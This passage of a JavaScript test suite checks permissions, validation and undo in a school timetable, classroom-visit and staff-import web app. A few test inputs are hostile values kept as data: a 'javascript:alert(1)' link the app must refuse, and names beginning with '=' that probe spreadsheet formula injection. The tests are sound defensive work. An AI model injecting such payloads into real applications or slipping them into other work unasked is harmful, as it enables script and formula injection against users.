ok(!!PL && plRows().length === 0 && PL.formats.some(f => f[4] === '@'), 'setup creates the Planner tab, as plain text');
throws(() => planner('exec@school.test'), 'FORBIDDEN', "a teacher cannot open the builder's setup");
throws(() => savePl('exec@school.test', EPI, SETUP, ''), 'FORBIDDEN', 'nor save one');
throws(() => savePl('vp@school.test', EPN, SETUP, ''), 'FORBIDDEN', "an admin cannot save another stage's setup");
ok(Object.keys(planner('vp@school.test').setups).length === 0, 'the builder starts with no setup');
const sv = savePl('vp@school.test', EPI, SETUP, ''), cl = sv.setup;
ok(cl.classes.join() === '5A,5B' && cl.subjects.length === 3 && cl.dayLen.join() === '8,8,8,8,7', 'a saved setup keeps its classes once each, its subjects and the sessions of each day');
ok(cl.teachers.length === 3 && cl.teachers[0].name === execName && cl.teachers[0].email === 'exec@school.test' && cl.teachers[0].subjects.join() === 'English' && cl.teachers[0].quota === 20,
  'a member of staff is stored under their own name, with only subjects that exist');
ok(cl.teachers[1].quota === 40 && cl.teachers[1].maxDay === 5 && cl.teachers[2].email === '' && cl.teachers[2].name === 'Outsider' && cl.teachers[2].quota === 24, 'quotas are bounded, and an address outside the stage is not kept');
ok(cl.loads.length === 3 && cl.loads[2].teacher === '' && cl.loads[0].count === 5, 'weekly sessions are kept once for each class and subject; a teacher who is not in the list is dropped from them');
ok(cl.rules.map(r => r.id).join() === 'r1,r2,r5' && cl.rules[0].days.join() === '0' && cl.rules[0].from === 6 && cl.rules[0].to === 8 && cl.rules[1].must === false && cl.rules[2].label === 'نشاط',
  'instructions of a known kind are kept and tidied; unknown kinds and ones naming something that is gone are dropped');
ok(plRows('setup').length === 1 && String(plRows('setup')[0][3]).startsWith('#{') && plRows('setup')[0][4] === 'vp@school.test', 'the setup is stored as text that can never be read as a formula');
const got = planner('vp@school.test');
ok(JSON.stringify(got.setups[EPI].setup) === JSON.stringify(cl) && got.setups[EPI].at === sv.at && !got.setups[MBI], 'it is read back as saved, for its stage only');
ok(!!planner('principal@school.test').setups[EPI], 'another admin of the stage sees the same setup');
throws(() => savePl('principal@school.test', EPI, cl, 'old'), 'STATE', 'a setup changed by someone else meanwhile is not overwritten');
const sv2 = savePl('principal@school.test', EPI, Object.assign({}, cl, { dayLen: [7, 7, 7, 7, 7] }), sv.at);
ok(sv2.at !== sv.at && sv2.at > sv.at && planner('vp@school.test').setups[EPI].setup.dayLen.join() === '7,7,7,7,7' && plRows('setup').length === 1, 'with the current version it is saved, and replaces the earlier copy');
throws(() => savePl('vp@school.test', EPI, { classes: Array.from({ length: 61 }, (_, i) => 'C' + i) }, sv2.at), 'INPUT', 'more than sixty classes are refused');
// a large setup is split over rows and read back whole
const big = { classes: Array.from({ length: 40 }, (_, i) => 'صف ' + (i + 1)), subjects: Array.from({ length: 30 }, (_, i) => 'مادة دراسية طويلة الاسم ' + (i + 1)), teachers: [], rules: [], loads: [] };
big.classes.forEach(k => big.subjects.forEach(su => big.loads.push({ klass: k, subject: su, count: 1, teacher: '' })));
const svBig = savePl('vp@school.test', MBI, big, '');
ok(plRows('setup').filter(r => r[0] === MBI).length > 1 && planner('vp@school.test').setups[MBI].setup.loads.length === 1200 && plRows('setup').every(r => String(r[3]).length <= 40001), 'a large setup is split over several rows and read back whole');
ok(planner('vp@school.test').setups[EPI].setup.classes.join() === '5A,5B', "and the other stage's setup is untouched");

// build with the same engine the page uses, then apply
const live = { dayLen: [8, 8, 8, 8, 8], classes: ['5A', '5B'], subjects: ['Maths', 'English', 'Science'],
  teachers: [{ id: 't1', name: 'x', email: 'exec@school.test', subjects: ['English'], quota: 24 }, { id: 't2', name: 'سعد الحربي', subjects: ['Maths', 'Science'], quota: 24 }],
  loads: ['5A', '5B'].flatMap(k => [{ klass: k, subject: 'Maths', count: 5, teacher: 't2' }, { klass: k, subject: 'English', count: 5, teacher: 't1' }, { klass: k, subject: 'Science', count: 3, teacher: 't2' }]),
  rules: [{ id: 'a1', type: 'fixed', klass: '', day: 2, period: 4, label: 'نشاط' }] };
const built = Solver.solve(live, 3);
const toRows = r => r.lessons.map(l => { const t = live.teachers.find(x => x.id === l.teacher); return { klass: l.klass, weekday: l.day, period: l.period, subject: l.subject, teacher: t && t.email || '', teacherName: t && !t.email ? t.name : '' }; })
  .concat(r.fixed.map(f => ({ klass: f.klass, weekday: f.day, period: f.period, subject: f.label })));
const applyS = (who, stage, lessons, classes) => { noLimits(); return as(who, () => JSON.parse(G('api_applySchedule')(JSON.stringify({ stage, lessons, classes })))); };
const rowsBuilt = toRows(built);
ok(built.unplaced.length === 0 && rowsBuilt.length === 28, 'the engine builds the sample: 26 sessions and the activity for each class');
// what is in the schedule before: two sessions of 5A, one of 6B, one in another stage
noLimits();
lesson('vp@school.test', { stage: EPI, klass: '5A', weekday: 0, period: 1, subject: 'Old one', teacherName: 'قديم' });
lesson('vp@school.test', { stage: EPI, klass: '5A', weekday: 0, period: 2, subject: 'Old two' });
const keptClass = lesson('vp@school.test', { stage: EPI, klass: '6B', weekday: rowsBuilt.find(x => x.teacher).weekday, period: rowsBuilt.find(x => x.teacher).period, subject: 'Kept', teacher: 'exec@school.test' });
lesson('vp@school.test', { stage: MBI, klass: '5A', weekday: 0, period: 1, subject: 'Other stage' });
ok(ttRows().length === 4, 'four sessions are in the schedule before applying');
throws(() => applyS('exec@school.test', EPI, rowsBuilt, live.classes), 'FORBIDDEN', 'a teacher cannot apply a built schedule');
throws(() => applyS('vp@school.test', EPN, rowsBuilt, live.classes), 'FORBIDDEN', 'an admin cannot apply to another stage');
throws(() => applyS('vp@school.test', EPI, [], live.classes), 'INPUT', 'an empty schedule is refused');
throws(() => applyS('vp@school.test', EPI, rowsBuilt.concat([{ klass: '5A', weekday: 5, period: 1, subject: 'X' }]), live.classes), 'INPUT', 'a schedule with a Friday session is refused');
throws(() => applyS('vp@school.test', EPI, rowsBuilt.concat([{ klass: '5A', weekday: 1, period: 9, subject: 'X' }]), live.classes), 'INPUT', 'or a ninth session');
throws(() => applyS('vp@school.test', EPI, rowsBuilt.concat([Object.assign({}, rowsBuilt[0], { subject: 'Twice' })]), live.classes), 'INPUT', 'or two sessions for one class in one slot');
throws(() => applyS('vp@school.test', EPI, rowsBuilt.concat([{ klass: '5C', weekday: 1, period: 1, subject: 'X', teacher: 'nobody@school.test' }]), live.classes), 'INPUT', 'or a teacher who is not staff of the stage');
ok(ttRows().length === 4 && plRows('backup').length === 0, 'a refused schedule changes nothing');
const ap = applyS('vp@school.test', EPI, rowsBuilt, live.classes);
const LC = vm.runInContext('LESSON_COLS', ctx), lcol = n => LC.indexOf(n), inStage = st => ttRows().filter(r => r[lcol('stage')] === st);
ok(ap.ok && ap.added === 28 && ap.removed === 2 && ap.classes === 2 && ttRows().length === 30, 'applying replaces the sessions of the classes built and reports the numbers');
ok(inStage(EPI).filter(r => r[lcol('klass')] === '6B').length === 1 && inStage(MBI).length === 1 && !ttRows().some(r => String(r[lcol('subject')]).startsWith('Old')), 'a class that was not built and another stage are untouched');
ok(ap.clashing === 1, 'a teacher who is also in a class that was not built is counted as a clash, not hidden');
const eng = ttRows().find(r => r[lcol('subject')] === 'English'), mat = ttRows().find(r => r[lcol('subject')] === 'Maths'), act = ttRows().filter(r => r[lcol('subject')] === 'نشاط');
ok(eng[lcol('teacher')] === 'exec@school.test' && eng[lcol('teacherName')] === execName && mat[lcol('teacher')] === '' && mat[lcol('teacherName')] === 'سعد الحربي', 'staff are stored by their account and its name; a typed teacher by name');
ok(act.length === 2 && act.every(r => String(r[lcol('weekday')]) === '2' && String(r[lcol('period')]) === '4'), 'the fixed activity is in the schedule for each class');
const seenT = table('exec@school.test');
ok(seenT.lessons.filter(l => l.mine).length === 11 && seenT.lessons.every(l => !('teacher' in l)), 'the teacher sees the new schedule, with their own sessions marked');
throws(() => as('principal@school.test', () => G('api_undoApply')(EPI, ap.undoId)), 'GONE', "another admin cannot undo someone's apply");
throws(() => as('exec@school.test', () => G('api_undoApply')(EPI, ap.undoId)), 'FORBIDDEN', 'nor can a teacher');
const un3 = JSON.parse(as('vp@school.test', () => G('api_undoApply')(EPI, ap.undoId)));
ok(un3.restored === 2 && ttRows().length === 4 && ttRows().filter(r => String(r[lcol('subject')]).startsWith('Old')).length === 2 && plRows('backup').length === 0, 'undo takes out what was applied and puts back what it replaced');
throws(() => as('vp@school.test', () => G('api_undoApply')(EPI, ap.undoId)), 'GONE', 'an apply is undone once');
const ap2 = applyS('vp@school.test', EPI, rowsBuilt, live.classes), ap3 = applyS('vp@school.test', EPI, rowsBuilt, live.classes);
ok(ap3.removed === 28 && ttRows().length === 30, 'applying again replaces the earlier build');
throws(() => as('vp@school.test', () => G('api_undoApply')(EPI, ap2.undoId)), 'GONE', 'only the latest apply can be undone');
JSON.parse(as('vp@school.test', () => G('api_undoApply')(EPI, ap3.undoId)));
ok(ttRows().length === 30 && ttRows().every(r => r[lcol('by')] === 'vp@school.test'), 'undoing the latest apply returns the build before it');
ok(JSON.parse(G('api_audit')(50)).some(a => a.action === 'schedule-applied') && JSON.parse(G('api_audit')(50)).some(a => a.action === 'schedule-undone'), 'applying and undoing are in the activity log');
ok(post({ fn: 'api_planner', args: [] }).code === 'AUTH' && post({ fn: 'api_savePlanner', args: ['{}'] }).code === 'AUTH' && post({ fn: 'api_applySchedule', args: ['{}'] }).code === 'AUTH' && post({ fn: 'api_undoApply', args: [EPI, 'x'] }).code === 'AUTH', 'the builder needs a session on the website too');
// ---- other platforms as buttons: a list in settings, each for the admins only or for everyone ----
const linksOf = who => JSON.parse(as(who, () => G('api_bootstrap')())).links;
const saveLinks = (who, links) => { noLimits(); return as(who, () => JSON.parse(G('api_saveSettings')(JSON.stringify({ links })))); };
const IDP = 'https://andalus-idp.online/';
ok(!props.has('LINKS') && linksOf('vp@school.test').length === 1 && linksOf('vp@school.test')[0].url === IDP && linksOf('vp@school.test')[0].who === 'admins', 'admins start with a button to the professional development platform');
ok(linksOf('exec@school.test').length === 0 && !JSON.stringify(as('exec@school.test', () => G('api_bootstrap')())).includes('andalus-idp'), "a teacher is not sent the admins' button at all");
throws(() => saveLinks('exec@school.test', []), 'FORBIDDEN', 'a teacher cannot change the buttons');
throws(() => saveLinks('vp@school.test', [{ name: 'X', url: 'http://plain.example' }]), 'INPUT', 'a link that is not https is refused');
throws(() => saveLinks('vp@school.test', [{ name: 'X', url: 'javascript:alert(1)' }]), 'INPUT', 'a link that is not a web address is refused');
throws(() => saveLinks('vp@school.test', [{ name: '', url: 'https://ok.example' }]), 'INPUT', 'a button needs a name');
throws(() => saveLinks('vp@school.test', Array.from({ length: 13 }, (_, i) => ({ name: 'P' + i, url: 'https://p' + i + '.example' }))), 'INPUT', 'more than twelve buttons are refused');
ok(!props.has('LINKS'), 'a refused list changes nothing');
const sl = saveLinks('vp@school.test', [{ name: 'منصة التطور المهني', url: IDP, who: 'admins' }, { name: '=EduPage', url: 'https://school.edupage.org/', who: 'all' }, { name: 'Odd', url: 'https://odd.example/', who: 'root' }]);
ok(sl.links.length === 3 && sl.links[1].name === "'=EduPage" && sl.links[2].who === 'admins', 'an admin saves the list; a name cannot become a formula, and an unknown audience means admins only');
const tl = linksOf('exec@school.test');
ok(tl.length === 1 && tl[0].url === 'https://school.edupage.org/' && !('who' in tl[0]) && linksOf('principal@school.test').length === 3, 'a teacher gets only the buttons meant for everyone');
ok(saveLinks('vp@school.test', []).links.length === 0 && linksOf('vp@school.test').length === 0 && props.get('LINKS') === '[]', 'an emptied list stays empty: the starting button does not come back');
ok(JSON.parse(as('vp@school.test', () => G('api_saveSettings')(JSON.stringify({ siteUrl: 'https://control.example.org/' })))).links.length === 0, 'saving other settings leaves the buttons as they are');
saveLinks('vp@school.test', [{ name: 'منصة التطور المهني', url: IDP, who: 'admins' }]);
// ---- classroom visits: a form for each admin role, visits kept under the teacher ----
const VS = control.getSheetByName('Visits'), vsRows = () => VS.data.slice(1).filter(r => r[0]);
const visitsOf = who => JSON.parse(as(who, () => G('api_visits')()));
const saveV = (who, o) => { noLimits(); return as(who, () => JSON.parse(G('api_saveVisit')(JSON.stringify(o)))).visit; };
const oneV = (who, id) => JSON.parse(as(who, () => G('api_visit')(id))).visit;
const top = form => form.sections.map(sec => sec.items.map(() => form.scale.length));
as('vp@school.test', () => G('api_saveUser')(JSON.stringify({ email: 'second@school.test', name: 'Second', role: 'teacher', stages: [EPI] })));
const v0 = visitsOf('vp@school.test'), vpForm = v0.forms.vp;
ok(!!VS && vsRows().length === 0 && VS.formats.some(f => f[4] === '@'), 'setup creates the Visits tab, as plain text');
ok(v0.lead && v0.kind === 'vp' && !v0.canEditForms && Object.keys(v0.forms).join() === 'principal,academic,vp' && v0.visits.length === 0 && vpForm.scale.length === 4 && vpForm.sections.length === 3,
  'a Vice Principal gets the three forms, uses the Vice Principal form, and cannot change forms');
ok(visitsOf('principal@school.test').kind === 'principal' && visitsOf('principal@school.test').canEditForms && visitsOf('owner@school.test').kind === '' && visitsOf('owner@school.test').canEditForms, 'the Principal uses the Principal form; the Principal and the owner may change forms');
const tv0 = visitsOf('exec@school.test');
ok(tv0.lead === false && tv0.visits.length === 0 && !('forms' in tv0), 'a teacher gets only their own visits, and no forms');
const V1 = { stage: EPI, teacher: 'exec@school.test', date: '2026-11-10', klass: '5A', subject: 'English', period: 3, answers: top(vpForm), strengths: 'تفاعل ممتاز\nسطر ثانٍ', improve: '=ليس صيغة', recommend: '', note: 'ملاحظة خاصة', kind: 'principal' };
V1.answers[0][0] = 2; V1.answers[0][1] = 0;
throws(() => saveV('exec@school.test', V1), 'FORBIDDEN', 'a teacher cannot record a visit');
throws(() => saveV('vp@school.test', Object.assign({}, V1, { stage: EPN })), 'FORBIDDEN', 'an admin cannot record a visit in another stage');
throws(() => saveV('vp@school.test', Object.assign({}, V1, { teacher: 'nobody@school.test' })), 'INPUT', 'the teacher must be staff of the stage');
throws(() => saveV('vp@school.test', Object.assign({}, V1, { teacher: 'vp@school.test' })), 'INPUT', 'an admin cannot visit themselves');
throws(() => saveV('vp@school.test', Object.assign({}, V1, { date: '2099-01-01' })), 'INPUT', 'a visit cannot be dated in the future');
throws(() => saveV('vp@school.test', Object.assign({}, V1, { date: '' })), 'INPUT', 'a visit needs a date');
throws(() => saveV('vp@school.test', Object.assign({}, V1, { period: 9 })), 'INPUT', 'there is no ninth session to visit');
throws(() => saveV('vp@school.test', Object.assign({}, V1, { answers: [[4, 4, null], [4, 4, 4], [4, 4, 4]] })), 'INPUT', 'every item must be rated or marked as not applying');
throws(() => saveV('vp@school.test', Object.assign({}, V1, { answers: [[4, 4, 9], [4, 4, 4], [4, 4, 4]] })), 'INPUT', 'a rating outside the scale is refused');
throws(() => saveV('vp@school.test', Object.assign({}, V1, { answers: vpForm.sections.map(sec => sec.items.map(() => 0)) })), 'INPUT', 'a visit with nothing rated is refused');
ok(vsRows().length === 0, 'a refused visit stores nothing');
const vis = saveV('vp@school.test', V1);
ok(vis.kind === 'vp' && vis.form.title === vpForm.title, "the form is the one of the visitor's role, whatever the page asks for");
ok(vis.score === 94 && vis.parts[0][1] === 75 && vis.parts[1][1] === 100 && vis.parts[2][1] === 100, 'the result is the share of full marks over the rated items, for the visit and for each domain (94%, first domain 75%)');
ok(vis.teacherName === execName && vis.byName === 'VP' && vis.mine && vis.shared && !vis.seen && vis.period === 3 && vis.note === 'ملاحظة خاصة' && vis.strengths.includes('\n'), 'the visit is kept under the teacher with the visitor, class, session and notes');
const VC = vm.runInContext('VISIT_COLS', ctx), vcell = n => vsRows()[0][VC.indexOf(n)];
ok(vsRows().length === 1 && String(vcell('data')).startsWith('#{') && String(vcell('parts')).startsWith('[') && vcell('teacher') === 'exec@school.test' && vcell('by') === 'vp@school.test', 'it is stored as one row, as text that cannot be read as a formula');
const seenByP = visitsOf('principal@school.test').visits;
ok(seenByP.length === 1 && seenByP[0].score === 94 && seenByP[0].teacher === 'exec@school.test' && !seenByP[0].mine && !('form' in seenByP[0]) && !('note' in seenByP[0]), 'another admin of the stage sees it in the list, without the full form');
ok(oneV('principal@school.test', vis.id).answers[0][0] === 2 && oneV('principal@school.test', vis.id).note === 'ملاحظة خاصة', 'and can open it in full');
const tv1 = visitsOf('exec@school.test').visits, tdet = oneV('exec@school.test', vis.id);
ok(tv1.length === 1 && tv1[0].score === 94 && tv1[0].byName === 'VP' && !('teacher' in tv1[0]) && !JSON.stringify(tv1).includes('vp@school.test'), "the teacher sees their own visit, with the visitor's name and not their address");
ok(tdet.form.sections.length === 3 && tdet.strengths.includes('تفاعل') && !('note' in tdet) && !JSON.stringify(tdet).includes('ملاحظة خاصة'), "the teacher opens it in full, without the visitor's private note");
throws(() => oneV('second@school.test', vis.id), 'FORBIDDEN', "another teacher cannot open someone else's visit");
ok(visitsOf('second@school.test').visits.length === 0, 'and does not see it listed');
throws(() => as('second@school.test', () => G('api_seenVisit')(vis.id)), 'FORBIDDEN', 'only the visited teacher can confirm reading it');
as('exec@school.test', () => G('api_seenVisit')(vis.id));
ok(visitsOf('vp@school.test').visits[0].seen && !!vcell('seenAt'), 'the teacher confirms reading the visit, and the admins see that');
const hidden = saveV('vp@school.test', Object.assign({}, V1, { date: '2026-11-12', shared: false }));
ok(!hidden.shared && visitsOf('exec@school.test').visits.length === 1 && visitsOf('vp@school.test').visits.length === 2, 'a visit that is not shared stays with the admins');
throws(() => oneV('exec@school.test', hidden.id), 'FORBIDDEN', 'the teacher cannot open a visit that was not shared');
// changing a visit
throws(() => saveV('principal@school.test', Object.assign({}, V1, { id: vis.id })), 'FORBIDDEN', "an admin cannot change another admin's visit");
throws(() => saveV('vp@school.test', Object.assign({}, V1, { id: 'missing' })), 'GONE', 'a visit that does not exist cannot be changed');
const ed1 = saveV('vp@school.test', Object.assign({}, V1, { id: vis.id, answers: top(vpForm), teacher: 'second@school.test', stage: MBI, klass: '5B' }));
ok(ed1.id === vis.id && ed1.score === 100 && ed1.klass === '5B' && ed1.teacher === 'exec@school.test' && ed1.stage === EPI && ed1.seen && vsRows().length === 2, 'the visitor changes the ratings and details; the teacher and stage of a visit stay as recorded');
// the forms
const NEWF = { title: 'استمارة الوكيل المعتمدة', scale: ['متحقق', 'غير متحقق'], sections: [{ title: 'الانضباط', items: ['الحضور في الوقت', '  ', 'ضبط الصف'] }, { title: 'فارغ', items: [] }] };
const saveF = (who, kind, form) => { noLimits(); return as(who, () => JSON.parse(G('api_saveVisitForm')(JSON.stringify({ kind, form })))); };
throws(() => saveF('vp@school.test', 'vp', NEWF), 'FORBIDDEN', 'a Vice Principal cannot change a visit form');
throws(() => saveF('exec@school.test', 'vp', NEWF), 'FORBIDDEN', 'nor a teacher');
throws(() => saveF('principal@school.test', 'hack', NEWF), 'INPUT', 'an unknown form is refused');
throws(() => saveF('principal@school.test', 'vp', Object.assign({}, NEWF, { scale: ['واحد'] })), 'INPUT', 'a scale needs at least two levels');
throws(() => saveF('principal@school.test', 'vp', Object.assign({}, NEWF, { sections: [{ title: 'x', items: [] }] })), 'INPUT', 'a form needs at least one item');
throws(() => saveF('principal@school.test', 'vp', Object.assign({}, NEWF, { title: '' })), 'INPUT', 'a form needs a title');
const sf = saveF('principal@school.test', 'vp', NEWF);
ok(sf.forms.vp.title === NEWF.title && sf.forms.vp.scale.length === 2 && sf.forms.vp.sections.length === 1 && sf.forms.vp.sections[0].items.length === 2 && sf.forms.principal.sections.length === 4, 'the Principal replaces a form; empty items and empty domains are dropped, the other forms stay');
ok(plRows().some(r => r[0] === '*' && r[1] === 'visitForm.vp') && !('*' in planner('principal@school.test').setups), "the form is kept in the control file, apart from the schedule builder's setups");
ok(oneV('vp@school.test', vis.id).form.title === vpForm.title && oneV('vp@school.test', vis.id).score === 100, 'a visit recorded earlier keeps the form it was filled with');
const ed2 = saveV('vp@school.test', Object.assign({}, V1, { id: vis.id, answers: V1.answers }));
ok(ed2.score === 94 && ed2.form.sections.length === 3, 'and is still changed against that earlier form');
throws(() => saveV('vp@school.test', Object.assign({}, V1, { date: '2026-11-13' })), 'INPUT', "a new visit must fit the new form: the old form's ratings are refused");
const nv = saveV('vp@school.test', Object.assign({}, V1, { date: '2026-11-13', answers: [[2, 1]] }));
ok(nv.form.title === NEWF.title && nv.score === 75, 'a new visit uses the new form (two levels: 2 and 1 give 75%)');
throws(() => saveV('owner@school.test', Object.assign({}, V1, { kind: '', answers: top(v0.forms.academic) })), 'INPUT', 'the owner must say which form they use');
const ov = saveV('owner@school.test', Object.assign({}, V1, { kind: 'academic', answers: top(v0.forms.academic), date: '2026-11-14' }));
ok(ov.kind === 'academic' && ov.score === 100 && ov.form.sections.length === 5, 'the owner records a visit with the form they choose');
// removing and undoing
throws(() => as('principal@school.test', () => G('api_deleteVisit')(nv.id)), 'FORBIDDEN', "an admin cannot remove another admin's visit");
throws(() => as('exec@school.test', () => G('api_deleteVisit')(nv.id)), 'FORBIDDEN', 'nor can a teacher');
const before4 = vsRows().length, del = JSON.parse(as('vp@school.test', () => G('api_deleteVisit')(nv.id)));
ok(vsRows().length === before4 - 1 && !visitsOf('vp@school.test').visits.some(x => x.id === nv.id), 'the visitor removes their visit');
throws(() => as('principal@school.test', () => G('api_undoVisit')(del.undoId)), 'GONE', "another admin cannot undo someone's removal");
const back4 = JSON.parse(as('vp@school.test', () => G('api_undoVisit')(del.undoId))).visit;
ok(back4.id === nv.id && back4.score === 75 && vsRows().length === before4 && oneV('vp@school.test', nv.id).form.title === NEWF.title, 'undo puts the visit back exactly as it was');
throws(() => as('vp@school.test', () => G('api_undoVisit')(del.undoId)), 'GONE', 'a removal is undone once');
JSON.parse(G('api_deleteVisit')(ov.id));
ok(vsRows().length === before4 - 1 && JSON.parse(G('api_audit')(60)).some(a => a.action === 'visit-recorded') && JSON.parse(G('api_audit')(60)).some(a => a.action === 'visit-form'), 'the owner can remove any visit; visits and form changes are in the activity log');
ok(post({ fn: 'api_visits', args: [] }).code === 'AUTH' && post({ fn: 'api_saveVisit', args: ['{}'] }).code === 'AUTH' && post({ fn: 'api_visit', args: ['x'] }).code === 'AUTH' && post({ fn: 'api_saveVisitForm', args: ['{}'] }).code === 'AUTH', 'visits need a session on the website too');
// ---- employees from a file: name, major, position, WhatsApp number, school email ----
const US = control.getSheetByName('Users'), UC = vm.runInContext('USER_COLS', ctx), usRows = () => US.data.slice(1).filter(r => r[0]);
const userOf = email => { const r = usRows().find(x => x[0] === email); return r ? Object.fromEntries(UC.map((c, i) => [c, r[i] === undefined ? '' : r[i]])) : null; };
const impU = (who, o) => { noLimits(); return as(who, () => JSON.parse(G('api_importUsers')(JSON.stringify(o)))); };
ok(UC.join().endsWith('phone,channel,major,position') && US.data[0].join().endsWith('major,position'), 'the Users tab has columns for major and position');
G('api_saveUser')(JSON.stringify({ email: 'second@school.test', name: 'Second', role: 'teacher', stages: [EPI], major: 'Physics', position: '=معلم أول' }));
ok(userOf('second@school.test').major === 'Physics' && userOf('second@school.test').position === "'=معلم أول" && JSON.parse(G('api_users')()).find(x => x.email === 'second@school.test').major === 'Physics', 'a user is saved with a major and a position, and they are listed');
G('api_saveUser')(JSON.stringify({ email: 'second@school.test', name: 'Second', role: 'teacher', stages: [EPI] }));
ok(userOf('second@school.test').major === 'Physics', 'saving a user without those fields leaves them as they were');
const FILE = [
  { line: 2, name: 'خالد العتيبي', email: 'Khalid@School.Test ', phone: '0501234567', major: 'رياضيات', position: 'معلم' },
  { line: 3, name: 'سامي الحربي', email: 'sami@school.test', phone: 501234568, major: 'علوم', position: 'معلم أول', stages: 'متوسط بنين عالمي، ابتدائي بنين عالمي' },
  { line: 4, name: 'Adam Clarke', email: 'adam@school.test', phone: '+966 50 123 4569', major: 'English', position: 'Teacher' },
  { line: 5, name: 'بلا بريد', email: '', phone: '', major: '', position: '' },
  { line: 6, name: 'من خارج المدرسة', email: 'x@gmail.com' },
  { line: 7, name: 'مكرر', email: 'khalid@school.test' },
  { line: 8, name: 'رقم خطأ', email: 'bad@school.test', phone: '12345' },
  { line: 9, name: 'مرحلة أخرى', email: 'other@school.test', stages: 'ابتدائي بنين أهلي' },
  { line: 10, name: 'مرحلة مجهولة', email: 'odd@school.test', stages: 'جامعة' },
  { line: 11, name: 'Exec الجديد', email: 'exec@school.test', phone: '٠٥٠١٢٣٤٥٧٠', major: 'English', position: 'منسق اللغة الإنجليزية', stages: [MBI] },
  { line: 12, name: 'مالك', email: 'owner@school.test', position: 'مدير تقنية' },
  { line: 13, name: 'Second', email: 'second@school.test', major: 'Physics' }
];
throws(() => impU('exec@school.test', { rows: FILE, stages: [EPI], dryRun: true }), 'FORBIDDEN', 'a teacher cannot import employees');
throws(() => impU('vp@school.test', { rows: [], stages: [EPI] }), 'INPUT', 'an empty file is refused');
throws(() => impU('vp@school.test', { rows: Array.from({ length: 501 }, (_, i) => ({ name: 'n', email: 'u' + i + '@school.test' })), stages: [EPI] }), 'INPUT', 'more than 500 employees at once are refused');
const usersBefore = usRows().length, dry = impU('vp@school.test', { rows: FILE, stages: [EPI], dryRun: true }), st = l => dry.rows.find(x => x.line === l);
ok(usRows().length === usersBefore && !plRows('usersUndo').length, 'checking a file changes nothing');
ok(dry.counts.added === 3 && dry.counts.updated === 1 && dry.counts.same === 1 && dry.counts.error === 7, 'the check counts what would be added, updated, left as it is, and what is wrong');
ok(st(2).status === 'new' && st(2).email === 'khalid@school.test' && st(11).status === 'update' && st(13).status === 'same', 'each row is marked new, update or unchanged');
ok(st(5).message.includes('بريد') && st(6).message.includes('school.test') && st(7).message.includes('مكرر') && st(7).message.includes('2') && st(8).message.includes('الواتساب') && st(9).message.includes('خارج صلاحيتك') && st(10).message.includes('غير معروفة') && st(12).message.includes('مالك'),
  'and each wrong row says why: no email, outside the school, repeated, bad number, a stage outside the admin\'s, an unknown stage, the owner\'s account');
const execWas = userOf('exec@school.test');
const done = impU('vp@school.test', { rows: FILE, stages: [EPI] });
const kh = userOf('khalid@school.test'), sa = userOf('sami@school.test'), ad = userOf('adam@school.test'), ex2 = userOf('exec@school.test');
ok(done.counts.added === 3 && done.counts.updated === 1 && usRows().length === usersBefore + 3 && done.users.length === usersBefore + 3 && !!done.undoId, 'importing saves the rows that pass and reports the rest');
ok(kh.name === 'خالد العتيبي' && kh.role === 'teacher' && kh.stages === EPI && String(kh.active) === 'true' && kh.major === 'رياضيات' && kh.position === 'معلم', 'a new employee is added as a teacher of the chosen stage, with major and position');
ok(kh.phone === '966501234567' && sa.phone === '966501234568' && ad.phone === '966501234569' && kh.channel === 'both', 'local Saudi numbers become international, and a number switches WhatsApp notifications on');
ok(sa.stages === 'متوسط بنين عالمي, ابتدائي بنين عالمي', "a stage column in the file decides that employee's stages");
ok(ex2.name === 'Exec الجديد' && ex2.phone === '966501234570' && ex2.position === 'منسق اللغة الإنجليزية' && ex2.role === 'teacher' && ex2.stages.includes(EPI) && ex2.stages.includes(MBI) && ex2.aliases === 'وليد يوسف' && ex2.channel === execWas.channel && execWas.name !== ex2.name,
  'an existing employee is updated: name, number, major and position change; role, other settings and earlier stages stay');
ok(userOf('owner@school.test').position === '' && !userOf('bad@school.test') && !userOf('x@gmail.com'), "the owner's account and the wrong rows are untouched");
ok(JSON.parse(as('khalid@school.test', () => G('api_bootstrap')())).me.role === 'teacher', 'an imported employee can sign in, as a teacher');
throws(() => impU('vp@school.test', { rows: [FILE[0]], stages: [EPI] }), 'INPUT', 'a file that changes nothing is said to change nothing');
throws(() => impU('vp@school.test', { rows: [{ name: 'جديد', email: 'new1@school.test' }], stages: [] }), 'INPUT', 'a new employee needs a stage');
const ownerImp = impU('owner@school.test', { rows: [{ name: 'مالك', email: 'owner@school.test', position: 'مدير تقنية' }, { name: 'معلم أهلي', email: 'ahli@school.test', stages: EPN }], stages: [] });
ok(ownerImp.counts.added === 1 && ownerImp.counts.updated === 1 && userOf('owner@school.test').position === 'مدير تقنية' && userOf('owner@school.test').role === 'owner' && userOf('ahli@school.test').stages === EPN, 'the owner can update their own account and add employees to any stage');
throws(() => as('vp@school.test', () => G('api_undoImportUsers')(done.undoId)), 'GONE', 'only the latest import can be undone');
throws(() => as('vp@school.test', () => G('api_undoImportUsers')(ownerImp.undoId)), 'GONE', "an admin cannot undo another admin's import");
const und = JSON.parse(G('api_undoImportUsers')(ownerImp.undoId));
ok(und.removed === 1 && und.restored === 1 && !userOf('ahli@school.test') && userOf('owner@school.test').position === '' && userOf('owner@school.test').role === 'owner', 'undo removes the accounts it added and puts back the ones it changed');
const again2 = impU('vp@school.test', { rows: [{ name: 'مؤقت', email: 'temp@school.test' }, { name: 'خالد', email: 'khalid@school.test', major: 'فيزياء' }], stages: [EPI] });
as('vp@school.test', () => G('api_saveUser')(JSON.stringify({ email: 'temp@school.test', name: 'مؤقت', role: 'vp', stages: [EPI] })));
const und2 = JSON.parse(as('vp@school.test', () => G('api_undoImportUsers')(again2.undoId)));
ok(und2.removed === 0 && !!userOf('temp@school.test') && userOf('khalid@school.test').major === 'رياضيات' && userOf('khalid@school.test').name === 'خالد العتيبي', 'undo leaves alone an account that was promoted meanwhile, and still restores the rest');
ok(JSON.parse(G('api_audit')(80)).some(a => a.action === 'users-imported') && JSON.parse(G('api_audit')(80)).some(a => a.action === 'users-import-undone'), 'imports and their undo are in the activity log');

// ---- a table from a Google Sheets link ----
const SID = 'S'.repeat(30), shared = new Book('كشف الموظفين', SID);
shared.sheets.push(new Sheet('مخفي', [['secret-tab']], true), new Sheet('الموظفون', [['الاسم', 'البريد'], ['أحمد', 'ahmad@school.test'], ['سعد', 'saad@school.test']]), new Sheet('ثانٍ', [['x']]));
shared.sheets[2].gid = 77; shared.owner = 'someone@school.test';
books[SID] = shared;
const readS = (who, url) => { noLimits(); return as(who, () => JSON.parse(G('api_readSheet')(url))); };
